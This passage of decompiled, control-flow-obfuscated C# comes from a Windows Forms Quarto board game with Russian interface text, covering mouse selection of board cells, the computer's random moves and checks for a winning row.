					num = ((int)num2 * -134516972) ^ 0xD519A9;
					continue;
				case 3u:
					num3++;
					num = (int)((num2 * 1624465450) ^ 0x4C40E881);
					continue;
				case 2u:
					num = ((int)num2 * -1581010725) ^ -420892629;
					continue;
				case 1u:
					num = (int)(num2 * 881991282) ^ -562287450;
					continue;
				case 0u:
					flag = num3 < 4;
					num = -1166703025;
					continue;
				default:
					return;
				case 20u:
					break;
				case 4u:
					return;
					IL_00d4:
					flag3 = (byte)num7 != 0;
					num = -1054713089;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		int num = Form1.smethod_38(e) / size;
		int num5 = default(int);
		bool flag2 = default(bool);
		int num4 = default(int);
		int num10 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag = default(bool);
		while (true)
		{
			int num2 = -118227419;
			while (true)
			{
				uint num3;
				int num6;
				switch ((num3 = (uint)num2 ^ 0xF485B3B5u) % 25u)
				{
				case 24u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num2 = (int)((num3 * 1768032682) ^ 0x75F4C7DF);
						continue;
					}
					num6 = 0;
					goto IL_0058;
				case 23u:
					num2 = ((int)num3 * -1711498831) ^ -1101213474;
					continue;
				case 22u:
					num2 = (int)(num3 * 1665252902) ^ -978215604;
					continue;
				case 21u:
					num5 = Form1.smethod_39(e) / size;
					num2 = ((int)num3 * -548849153) ^ -251143653;
					continue;
				case 20u:
					flag2 = Form1.smethod_41((Control)(object)borderBox[num4, num10]) == Color.Blue;
					num2 = -1056670419;
					continue;
				case 19u:
					num10 = 0;
					num2 = -354912416;
					continue;
				case 18u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num4, num10]), num * size + 4, num5 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num2 = (int)((num3 * 1946653935) ^ 0x7731B869);
					continue;
				case 17u:
				{
					int num13;
					if (num10 < 4)
					{
						num2 = -838229878;
						num13 = -838229878;
					}
					else
					{
						num2 = -788156648;
						num13 = -788156648;
					}
					continue;
				}
				case 16u:
					num4++;
					num2 = ((int)num3 * -1677069023) ^ 0xF144785;
					continue;
				case 15u:
				{
					int num11;
					int num12;
					if (flag)
					{
						num11 = -2138432937;
						num12 = -2138432937;
					}
					else
					{
						num11 = -120665641;
						num12 = -120665641;
					}
					num2 = num11 ^ ((int)num3 * -488289350);
					continue;
				}
				case 14u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num2 = ((int)num3 * -529399991) ^ 0x1506DA0B;
					continue;
				case 13u:
					num2 = ((int)num3 * -928830587) ^ 0x7C5F0A29;
					continue;
				case 12u:
					num10++;
					num2 = -354912416;
					continue;
				case 11u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num2 = (int)((num3 * 290088332) ^ 0x27E78C61);
					continue;
				case 10u:
					Paint_Board();
					num2 = (int)(num3 * 84216223) ^ -385967698;
					continue;
				case 9u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.Red, 3f), ((float)num + 0.05f) * (float)size, ((float)num5 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num2 = (int)(num3 * 1150980430) ^ -80047741;
					continue;
				case 8u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num2 = (int)(num3 * 1170468207) ^ -1892131440;
					continue;
				case 7u:
					Form1.smethod_45(graphics_);
					num2 = ((int)num3 * -1717524404) ^ 0x32C83A4;
					continue;
				case 5u:
				{
					int num8;
					int num9;
					if (!flag2)
					{
						num8 = -40716106;
						num9 = -40716106;
					}
					else
					{
						num8 = -997654725;
						num9 = -997654725;
					}
					num2 = num8 ^ ((int)num3 * -118461274);
					continue;
				}
				case 4u:
				{
					int num7;
					if (num4 >= 4)
					{
						num2 = -397621499;
						num7 = -397621499;
					}
					else
					{
						num2 = -461865800;
						num7 = -461865800;
					}
					continue;
				}
				case 3u:
					num6 = ((board[num5, num] == null) ? 1 : 0);
					goto IL_0058;
				case 2u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num2 = ((int)num3 * -886848670) ^ -1534897136;
					continue;
				case 1u:
					num4 = 0;
					num2 = (int)(num3 * 1397827046) ^ -1333757896;
					continue;
				default:
					return;
				case 0u:
					break;
				case 6u:
					return;
					IL_0058:
					flag = (byte)num6 != 0;
					num2 = -1250525368;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_0f98: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fc6: Expected O, but got Unknown
		int num3 = default(int);
		int num7 = default(int);
		int num6 = default(int);
		int num24 = default(int);
		Figurine[,] array3 = default(Figurine[,]);
		bool flag5 = default(bool);
		bool flag2 = default(bool);
		int num11 = default(int);
		bool flag9 = default(bool);
		int num33 = default(int);
		bool flag11 = default(bool);
		int num19 = default(int);
		int num20 = default(int);
		int num8 = default(int);
		int num18 = default(int);
		int num49 = default(int);
		int num5 = default(int);
		int num4 = default(int);
		bool flag4 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num39 = default(int);
		int num9 = default(int);
		bool flag7 = default(bool);
		int num29 = default(int);
		bool flag3 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		int num13 = default(int);
		int num14 = default(int);
		Graphics graphics_ = default(Graphics);
		bool flag12 = default(bool);
		bool flag13 = default(bool);
		int num12 = default(int);
		int num15 = default(int);
		bool flag10 = default(bool);
		bool flag = default(bool);
		int num30 = default(int);
		bool flag8 = default(bool);
		bool flag6 = default(bool);
		while (true)
		{
			int num = -1072779709;
			while (true)
			{
				uint num2;
				int num41;
				int num21;
				int num50;
				int num58;
				switch ((num2 = (uint)num ^ 0xA0092431u) % 178u)
				{
				case 177u:
					num = -90910858;
					continue;
				case 176u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = -1556555321;
					continue;
				case 175u:
					num3++;
					num = ((int)num2 * -2104288657) ^ 0x47BE2BC7;
					continue;
				case 174u:
					num = (int)(num2 * 1622949349) ^ -774787976;
					continue;
				case 173u:
					num7 = 0;
					num = ((int)num2 * -369425378) ^ 0x146188E;
					continue;
				case 172u:
					num6 = 0;
					num = (int)((num2 * 196908730) ^ 0x7A038F2D);
					continue;
				case 171u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -471593625) ^ -789129849;
					continue;
				case 170u:
					num6 = num24;
					num = (int)(num2 * 1600917411) ^ -1082975776;
					continue;
				case 169u:
					if (!Stop(array3))
					{
						num = ((int)num2 * -1617550578) ^ -740306633;
						continue;
					}
					num41 = 1;
					goto IL_00d5;
				case 168u:
					num = (int)(num2 * 222815324) ^ -320051542;
					continue;
				case 167u:
					num = -2122522709;
					continue;
				case 166u:
				{
					int num63;
					int num64;
					if (flag5)
					{
						num63 = -603931611;
						num64 = -603931611;
					}
					else
					{
						num63 = -1370815324;
						num64 = -1370815324;
					}
					num = num63 ^ ((int)num2 * -273973900);
					continue;
				}
				case 165u:
					flag2 = Standoff(board);
					num = (int)((num2 * 759844017) ^ 0x656CCC2A);
					continue;
				case 164u:
					Form1.smethod_30((Control)(object)pictureBox[num7, num11]);
					num = ((int)num2 * -1221554471) ^ -946188303;
					continue;
				case 163u:
					if (!flag9)
					{
						num = ((int)num2 * -1396787503) ^ -1464029866;
						continue;
					}
					goto IL_0189;
				case 162u:
					num33 = 0;
					num = (int)(num2 * 1279133632) ^ -982530248;
					continue;
				case 161u:
					num = (int)(num2 * 1027460653) ^ -801981056;
					continue;
				case 160u:
					num = ((int)num2 * -1794100118) ^ 0x2226E840;
					continue;
				case 159u:
				{
					int num54;
					int num55;
					if (!flag11)
					{
						num54 = -293074068;
						num55 = -293074068;
					}
					else
					{
						num54 = -1043344765;
						num55 = -1043344765;
					}
					num = num54 ^ ((int)num2 * -113094843);
					continue;
				}
				case 158u:
					Form1.smethod_30((Control)(object)borderBox[num33, num24]);
					num = (int)((num2 * 1281297856) ^ 0xA79C23A);
					continue;
				case 157u:
					num19 = 0;
					num20 = 0;
					num8 = 0;
					num18 = 0;
					num = (int)((num2 * 423296370) ^ 0x63376F10);
					continue;
				case 156u:
					num41 = (Standoff(array3) ? 1 : 0);
					goto IL_00d5;
				case 155u:
					num49 = 0;
					num = (int)((num2 * 1583622675) ^ 0x7C0155E2);
					continue;
				case 154u:
					num5 = 0;
					num = (int)(num2 * 1673511596) ^ -1469885817;
					continue;
				case 153u:
					Form1.smethod_47(200);
					num = ((int)num2 * -1645024403) ^ -511560026;
					continue;
				case 152u:
					num = ((int)num2 * -651205565) ^ 0x3895A501;
					continue;
				case 151u:
					num21 = ((!Standoff(board)) ? 1 : 0);
					goto IL_02c5;
				case 150u:
				{
					int num44;
					if (num4 >= 4)
					{
						num = -775355904;
						num44 = -775355904;
					}
					else
					{
						num = -2135249462;
						num44 = -2135249462;
					}
					continue;
				}
				case 149u:
					flag4 = array[num39, num9] == null;
					num = -1278364618;
					continue;
				case 148u:
				{
					int num37;
					int num38;
					if (!(Form1.smethod_41((Control)(object)borderBox[num7, num11]) == Color.Blue))
					{
						num37 = -1969572024;
						num38 = -1969572024;
					}
					else
					{
						num37 = -157874049;
						num38 = -157874049;
					}
					num = num37 ^ ((int)num2 * -12009561);
					continue;
				}
				case 147u:
					num = -1706040159;
					continue;
				case 146u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					step++;
					num = (int)(num2 * 2019647767) ^ -1320886260;
					continue;
				case 145u:
					flag7 = num33 < 4;
					num = -124741363;
					continue;
				case 144u:
					num = (int)(num2 * 822123162) ^ -1663960969;
					continue;
				case 143u:
				{
					int num27;
					int num28;
					if (flag4)
					{
						num27 = -1813715227;
						num28 = -1813715227;
					}
					else
					{
						num27 = -690655724;
						num28 = -690655724;
					}
					num = num27 ^ ((int)num2 * -1180765559);
					continue;
				}
				case 142u:
					num = ((int)num2 * -1284987868) ^ 0x23A20BA3;
					continue;
				case 141u:
					num29++;
					num = (int)(num2 * 1074465457) ^ -1356498673;
					continue;
				case 140u:
					num24 = 0;
					num = -1017821522;
					continue;
				case 139u:
					num24++;
					num = -1424464000;
					continue;
				case 138u:
					flag3 = Form1.smethod_46((Control)(object)pictureBox1);
					num = ((int)num2 * -1624213197) ^ 0x749A2D29;
					continue;
				case 137u:
					num = (int)((num2 * 177242918) ^ 0x22451168);
					continue;
				case 136u:
					array2 = (Figurine[,])Form1.smethod_48((Array)array);
					num = ((int)num2 * -1879948943) ^ 0x30D59D24;
					continue;
				case 135u:
					num = ((int)num2 * -1048438240) ^ -1764801982;
					continue;
				case 134u:
					Form1.smethod_5((Control)(object)borderBox[num13, num14], Color.Blue);
					num = (int)((num2 * 1368813311) ^ 0x276695A4);
					continue;
				case 133u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -328220777) ^ -1607754392;
					continue;
				case 132u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = (int)((num2 * 2076880415) ^ 0x3CCDC049);
					continue;
				case 131u:
					storage[num5, num6] = null;
					num = ((int)num2 * -548610875) ^ -1917285561;
					continue;
				case 130u:
				{
					int num61;
					int num62;
					if (!flag12)
					{
						num61 = -303386674;
						num62 = -303386674;
					}
					else
					{
						num61 = -155346229;
						num62 = -155346229;
					}
					num = num61 ^ (int)(num2 * 239080474);
					continue;
				}
				case 129u:
					num33++;
					num = (int)(num2 * 350183459) ^ -1063139363;
					continue;
				case 128u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					num = (int)((num2 * 1898640527) ^ 0x5A42FF97);
					continue;
				case 127u:
					storage[num5, num6] = null;
					num = ((int)num2 * -1571455911) ^ -1718682070;
					continue;
				case 126u:
					flag13 = board[num12, num15] != null;
					num = (int)(num2 * 942893960) ^ -1416523231;
					continue;
				case 124u:
					array3[num3, num4] = new Figurine(storage[num5, num6]);
					num = (int)((num2 * 235063771) ^ 0x455856D4);
					continue;
				case 123u:
					Form1.smethod_15(timer1);
					num = ((int)num2 * -584919721) ^ 0x548894A3;
					continue;
				case 122u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 1243789862) ^ -1457903880;
					continue;
				case 121u:
					num7++;
					num = ((int)num2 * -688963749) ^ 0x577D4508;
					continue;
				case 120u:
				{
					int num59;
					int num60;
					if (!flag13)
					{
						num59 = -580168556;
						num60 = -580168556;
					}
					else
					{
						num59 = -2069910796;
						num60 = -2069910796;
					}
					num = num59 ^ (int)(num2 * 1311791608);
					continue;
				}
				case 119u:
					if (num14 == num6)
					{
						goto IL_0684;
					}
					goto IL_0690;
				case 118u:
					num39++;
					num = (int)(num2 * 446921616) ^ -1282584481;
					continue;
				case 117u:
					flag12 = num24 < 4;
					num = -1587545945;
					continue;
				case 116u:
					num = ((int)num2 * -1739360707) ^ -1959669074;
					continue;
				case 115u:
					num9 = 0;
					num = -1421374625;
					continue;
				case 114u:
				{
					int num56;
					int num57;
					if (!flag7)
					{
						num56 = 570194459;
						num57 = 570194459;
					}
					else
					{
						num56 = 839817447;
						num57 = 839817447;
					}
					num = num56 ^ ((int)num2 * -192550039);
					continue;
				}
				case 113u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = ((int)num2 * -1398413953) ^ 0x12CC8EDC;
					continue;
				case 112u:
					num9++;
					num = -1264104718;
					continue;
				case 111u:
					num4++;
					num = -1021190063;
					continue;
				case 110u:
					num = (int)(num2 * 976380573) ^ -1806984777;
					continue;
				case 109u:
					flag11 = Standoff(board);
					num = -866692148;
					continue;
				case 108u:
					num4 = 0;
					num = -48931336;
					continue;
				case 107u:
					num = ((int)num2 * -673638184) ^ 0xBE179A8;
					continue;
				case 106u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -618875536) ^ 0x121FBE4D;
					continue;
				case 105u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)((num2 * 2041305223) ^ 0x5081E445);
					continue;
				case 104u:
					num = -1601343622;
					continue;
				case 103u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1076273834) ^ 0x8AA6A25;
					continue;
				case 102u:
					num = ((int)num2 * -1754632957) ^ -1668370760;
					continue;
				case 101u:
					num = ((int)num2 * -1534503182) ^ -985890535;
					continue;
				case 100u:
					num29 = 0;
					num = (int)((num2 * 22156070) ^ 0x6A73D166);
					continue;
				case 99u:
					num = (int)(num2 * 633694266) ^ -1680757850;
					continue;
				case 98u:
					num = (int)(num2 * 317584209) ^ -912548149;
					continue;
				case 97u:
					num18 = num11;
					num = ((int)num2 * -162058485) ^ -1958928455;
					continue;
				case 96u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num4 + 0.05f) * (float)size, ((float)num3 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num4 * size + 4, num3 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 302319546) ^ 0x76847DA);
					continue;
				case 95u:
					flag10 = num29 < 4;
					num = -1137331698;
					continue;
				case 94u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = ((int)num2 * -1654111955) ^ 0x7D9AEA8D;
					continue;
				case 93u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = (int)((num2 * 1567907790) ^ 0x5A88E8CB);
					continue;
				case 92u:
					Form1.smethod_7((Control)(object)pictureBox[num33, num24], bool_0: false);
					num = -1285955645;
					continue;
				case 91u:
					if (num13 == num5)
					{
						num = ((int)num2 * -1129162083) ^ 0x322749E7;
						continue;
					}
					goto IL_0690;
				case 90u:
					if (storage[num13, num14] != null)
					{
						num = ((int)num2 * -1634879184) ^ -1938073558;
						continue;
					}
					goto IL_0684;
				case 89u:
				{
					int num52;
					int num53;
					if (!flag10)
					{
						num52 = 1077019314;
						num53 = 1077019314;
					}
					else
					{
						num52 = 1053001754;
						num53 = 1053001754;
					}
					num = num52 ^ (int)(num2 * 1434396852);
					continue;
				}
				case 88u:
					num20 = num11;
					num = (int)(num2 * 378177887) ^ -1444222243;
					continue;
				case 87u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -852823112) ^ 0x3D5CC988;
					continue;
				case 86u:
					num = ((int)num2 * -1195631682) ^ 0x2230279F;
					continue;
				case 85u:
					num = ((int)num2 * -1629950198) ^ -1945532384;
					continue;
				case 84u:
					num49++;
					flag9 = false;
					num = -1189507340;
					continue;
				case 83u:
					num = (int)((num2 * 1275411511) ^ 0x5891D1B8);
					continue;
				case 82u:
					num = (int)((num2 * 907576082) ^ 0x23151167);
					continue;
				case 81u:
					Form1.smethod_47(200);
					num = ((int)num2 * -808024525) ^ -280558387;
					continue;
				case 80u:
					flag9 = true;
					num = ((int)num2 * -527817120) ^ -1150394272;
					continue;
				case 79u:
					num = -2041104805;
					continue;
				case 78u:
					array = (Figurine[,])Form1.smethod_48((Array)board);
					array[num12, num15] = new Figurine(storage[num5, num6]);
					num = (int)((num2 * 1311484133) ^ 0x54BC844A);
					continue;
				case 77u:
					num = (int)(num2 * 1593506688) ^ -363387580;
					continue;
				case 76u:
				{
					int num51;
					if (num7 >= 4)
					{
						num = -1600521374;
						num51 = -1600521374;
					}
					else
					{
						num = -1333375024;
						num51 = -1333375024;
					}
					continue;
				}
				case 75u:
					num = ((int)num2 * -1399532637) ^ -1165461801;
					continue;
				case 74u:
					num3 = 0;
					num = ((int)num2 * -456984056) ^ -613705645;
					continue;
				case 73u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -1362792060) ^ 0x4FCE90A;
					continue;
				case 72u:
					num = ((int)num2 * -1581525079) ^ -1023780508;
					continue;
				case 71u:
					Form1.smethod_5((Control)(object)borderBox[num33, num24], Color.LimeGreen);
					num = (int)((num2 * 1844132643) ^ 0x4D579618);
					continue;
				case 70u:
					if (num49 >= 9)
					{
						num = -14256357;
						num50 = -14256357;
						continue;
					}
					goto IL_0189;
				case 69u:
					num = (int)(num2 * 631034473) ^ -203496919;
					continue;
				case 68u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -1738832969) ^ 0x4B18C03;
					continue;
				case 67u:
					Form1.smethod_30((Control)(object)label2);
					num = ((int)num2 * -1077431056) ^ -1268249815;
					continue;
				case 66u:
					num = (int)((num2 * 1618838478) ^ 0x434F5A04);
					continue;
				case 65u:
					num = (int)((num2 * 2110219206) ^ 0x4D553C33);
					continue;
				case 64u:
					num5 = num33;
					num = ((int)num2 * -1583166979) ^ -528688113;
					continue;
				case 63u:
					num = (int)((num2 * 1674728311) ^ 0x4C61015B);
					continue;
				case 62u:
					num19 = num7;
					num = (int)((num2 * 404006010) ^ 0x51452943);
					continue;
				case 61u:
					flag = board[num3, num4] == null;
					num = -1248747398;
					continue;
				case 60u:
					Form1.smethod_7((Control)(object)pictureBox[num29, num30], bool_0: true);
					num = -1281954114;
					continue;
				case 59u:
					num30++;
					num = ((int)num2 * -1635555130) ^ -1617351578;
					continue;
				case 58u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)((num2 * 857634739) ^ 0x21BB4C13);
					continue;
				case 57u:
				{
					int num47;
					int num48;
					if (!flag8)
					{
						num47 = -603461203;
						num48 = -603461203;
					}
					else
					{
						num47 = -1486218366;
						num48 = -1486218366;
					}
					num = num47 ^ ((int)num2 * -746257989);
					continue;
				}
				case 56u:
					num = ((int)num2 * -1736267115) ^ -1891457287;
					continue;
				case 55u:
				{
					array2[num39, num9] = new Figurine(storage[num13, num14]);
					int num45;
					int num46;
					if (Stop(array2))
					{
						num45 = -1053515334;
						num46 = -1053515334;
					}
					else
					{
						num45 = -1037310567;
						num46 = -1037310567;
					}
					num = num45 ^ ((int)num2 * -1379983335);
					continue;
				}
				case 54u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 146279431) ^ -624359687;
					continue;
				case 53u:
					num = (int)((num2 * 453318727) ^ 0x4F28D028);
					continue;
				case 52u:
					num = (int)((num2 * 619287925) ^ 0x2B8A6BC0);
					continue;
				case 51u:
				{
					int num43;
					if (num30 < 4)
					{
						num = -46639933;
						num43 = -46639933;
					}
					else
					{
						num = -1075087108;
						num43 = -1075087108;
					}
					continue;
				}
				case 50u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num15 * size + 4, num12 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)(num2 * 1336707582) ^ -662864404;
					continue;
				case 49u:
					num = (int)(num2 * 571547048) ^ -537571143;
					continue;
				case 48u:
					num13 = Form1.smethod_33(rnd, 4);
					num14 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1710195265) ^ -283220883;
					continue;
				case 47u:
					num = ((int)num2 * -258964963) ^ -202415178;
					continue;
				case 46u:
					Form1.smethod_20(pictureBox[num5, num6], (Image)null);
					num = ((int)num2 * -380314008) ^ -1910009279;
					continue;
				case 45u:
					step++;
					num = -1142513835;
					continue;
				case 44u:
					Form1.smethod_5((Control)(object)borderBox[num7, num11], Color.White);
					num = (int)(num2 * 748334581) ^ -1654180830;
					continue;
				case 43u:
					(menu as Form3).ContinueLock();
					num = ((int)num2 * -754416061) ^ -317566269;
					continue;
				case 42u:
					num = (int)((num2 * 1201731594) ^ 0x29EB4ADE);
					continue;
				case 41u:
				{
					int num42;
					if (!(Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num11 * size + size / 2, (int)(((float)num7 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0)))
					{
						num = -1590935484;
						num42 = -1590935484;
					}
					else
					{
						num = -2128836055;
						num42 = -2128836055;
					}
					continue;
				}
				case 40u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = (int)(num2 * 949702555) ^ -961550443;
					continue;
				case 39u:
					num11 = 0;
					num = -408554939;
					continue;
				case 38u:
				{
					int num40;
					if (num39 >= 4)
					{
						num = -661847388;
						num40 = -661847388;
					}
					else
					{
						num = -560950046;
						num40 = -560950046;
					}
					continue;
				}
				case 37u:
					Form1.smethod_30((Control)(object)borderBox[num7, num11]);
					num = ((int)num2 * -1970151026) ^ 0x6A88A118;
					continue;
				case 36u:
					Form1.smethod_5((Control)(object)borderBox[num5, num6], Color.White);
					num = ((int)num2 * -1649099009) ^ 0x1A3EE5F7;
					continue;
				case 35u:
					num39 = 0;
					num = ((int)num2 * -1483089720) ^ 0x4A2A015B;
					continue;
				case 34u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num15 + 0.05f) * (float)size, ((float)num12 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -1965316116) ^ -837367936;
					continue;
				case 33u:
				{
					int num36;
					if (num11 >= 4)
					{
						num = -1991592658;
						num36 = -1991592658;
					}
					else
					{
						num = -100034882;
						num36 = -100034882;
					}
					continue;
				}
				case 32u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = (int)(num2 * 1294241981) ^ -2007499657;
					continue;
				case 30u:
					num = ((int)num2 * -2059787494) ^ -669392839;
					continue;
				case 29u:
					num = -494757949;
					continue;
				case 28u:
				{
					int num34;
					int num35;
					if (Form1.smethod_41((Control)(object)borderBox[num33, num24]) == Color.Red)
					{
						num34 = -480480513;
						num35 = -480480513;
					}
					else
					{
						num34 = -1933858536;
						num35 = -1933858536;
					}
					num = num34 ^ ((int)num2 * -1542870533);
					continue;
				}
				case 27u:
					num11++;
					num = -475789542;
					continue;
				case 26u:
				{
					int num31;
					int num32;
					if (!flag6)
					{
						num31 = -816986918;
						num32 = -816986918;
					}
					else
					{
						num31 = -807394779;
						num32 = -807394779;
					}
					num = num31 ^ (int)(num2 * 1465382446);
					continue;
				}
				case 25u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -979432755) ^ -541272613;
					continue;
				case 24u:
					num = (int)((num2 * 742534269) ^ 0x183BD06F);
					continue;
				case 23u:
					num = (int)(num2 * 1106202565) ^ -230193220;
					continue;
				case 22u:
					Form1.smethod_15(timer1);
					num = -2000425366;
					continue;
				case 21u:
					flag5 = num3 < 4;
					num = -126749727;
					continue;
				case 20u:
					Form1.smethod_30((Control)(object)borderBox[num5, num6]);
					num = ((int)num2 * -1495024873) ^ 0x45193ADC;
					continue;
				case 19u:
					num30 = 0;
					num = -872933912;
					continue;
				case 18u:
				{
					int num25;
					int num26;
					if (!flag3)
					{
						num25 = 705806102;
						num26 = 705806102;
					}
					else
					{
						num25 = 2018697856;
						num26 = 2018697856;
					}
					num = num25 ^ (int)(num2 * 14132618);
					continue;
				}
				case 17u:
					num15 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 1706744482) ^ -504072727;
					continue;
				case 16u:
				{
					int num22;
					int num23;
					if (flag2)
					{
						num22 = 173757437;
						num23 = 173757437;
					}
					else
					{
						num22 = 2059785775;
						num23 = 2059785775;
					}
					num = num22 ^ (int)(num2 * 573654152);
					continue;
				}
				case 15u:
					num = ((int)num2 * -1386047837) ^ 0x6F3F0A94;
					continue;
				case 14u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1455535887) ^ 0x1EFF20E6);
					continue;
				case 13u:
					board[num8, num18] = new Figurine(storage[num19, num20]);
					storage[num19, num20] = null;
					Paint_Board();
					if (!Stop(board))
					{
						num = (int)((num2 * 1167299649) ^ 0x5357024D);
						continue;
					}
					num21 = 0;
					goto IL_02c5;
				case 12u:
					num = ((int)num2 * -999551093) ^ -195841959;
					continue;
				case 11u:
				{
					int num16;
					int num17;
					if (flag)
					{
						num16 = -19984561;
						num17 = -19984561;
					}
					else
					{
						num16 = -441552506;
						num17 = -441552506;
					}
					num = num16 ^ ((int)num2 * -802126128);
					continue;
				}
				case 10u:
					board[num12, num15] = new Figurine(storage[num5, num6]);
					num = (int)((num2 * 2001074436) ^ 0x4AFCBA2);
					continue;
				case 9u:
					num = (int)((num2 * 467306401) ^ 0x672A2EF9);
					continue;
				case 8u:
					Form1.smethod_30((Control)(object)borderBox[num13, num14]);
					num = (int)(num2 * 962483645) ^ -1013206101;
					continue;
				case 7u:
					num12 = Form1.smethod_33(rnd, 4);
					num = -74081612;
					continue;
				case 6u:
					Form1.smethod_20(pictureBox[num7, num11], (Image)null);
					num = ((int)num2 * -344816927) ^ -1520051539;
					continue;
				case 5u:
				{
					int num10;
					if (num9 >= 4)
					{
						num = -1660018265;
						num10 = -1660018265;
					}
					else
					{
						num = -1090767992;
						num10 = -1090767992;
					}
					continue;
				}
				case 4u:
					num = ((int)num2 * -407925550) ^ -2054277510;
					continue;
				case 3u:
					num = (int)(num2 * 1516565698) ^ -1722404048;
					continue;
				case 2u:
					Form1.smethod_30((Control)(object)pictureBox[num5, num6]);
					num = (int)((num2 * 656223847) ^ 0x33C81893);
					continue;
				case 1u:
					num8 = num7;
					num = (int)((num2 * 2104992567) ^ 0x1EB26B91);
					continue;
				case 0u:
					board[num3, num4] = new Figurine(storage[num5, num6]);
					num = ((int)num2 * -1837134122) ^ -742160474;
					continue;
				default:
					return;
				case 31u:
					break;
				case 125u:
					return;
					IL_02c5:
					flag8 = (byte)num21 != 0;
					num = -1971904808;
					continue;
					IL_00d5:
					flag6 = (byte)num41 != 0;
					num = -2128678797;
					continue;
					IL_0684:
					num = -521310060;
					num58 = -521310060;
					continue;
					IL_0690:
					num = -710385343;
					num58 = -710385343;
					continue;
					IL_0189:
					num = -1185588691;
					num50 = -1185588691;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		int num5 = default(int);
		bool flag = default(bool);
		bool result = default(bool);
		bool flag2 = default(bool);
		while (true)
		{
			int num = 2016658266;
			while (true)
			{
				uint num2;
				int num9;
				int num8;
				switch ((num2 = (uint)num ^ 0x3D1D6E1Cu) % 75u)
				{
				case 74u:
				{
					int num39;
					if (mem[0, 3].Dark == mem[1, 2].Dark)
					{
						num = 1829719833;
						num39 = 1829719833;
					}
					else
					{
						num = 1935933965;
						num39 = 1935933965;
					}
					continue;
				}
				case 73u:
				{
					int num61;
					if (mem[0, num5].Dark != mem[1, num5].Dark)
					{
						num = 1131297031;
						num61 = 1131297031;
					}
					else
					{
						num = 1983811635;
						num61 = 1983811635;
					}
					continue;
				}
				case 72u:
				{
					int num26;
					int num27;
					if (mem[2, 2] == null)
					{
						num26 = 1421964765;
						num27 = 1421964765;
					}
					else
					{
						num26 = 1909507447;
						num27 = 1909507447;
					}
					num = num26 ^ ((int)num2 * -757785351);
					continue;
				}
				case 71u:
				{
					int num66;
					int num67;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num66 = 205219789;
						num67 = 205219789;
					}
					else
					{
						num66 = 395605543;
						num67 = 395605543;
					}
					num = num66 ^ (int)(num2 * 923063315);
					continue;
				}
				case 70u:
				{
					int num32;
					int num33;
					if (mem[num5, 1].Big == mem[num5, 2].Big)
					{
						num32 = -1317376733;
						num33 = -1317376733;
					}
					else
					{
						num32 = -444168402;
						num33 = -444168402;
					}
					num = num32 ^ ((int)num2 * -1456821617);
					continue;
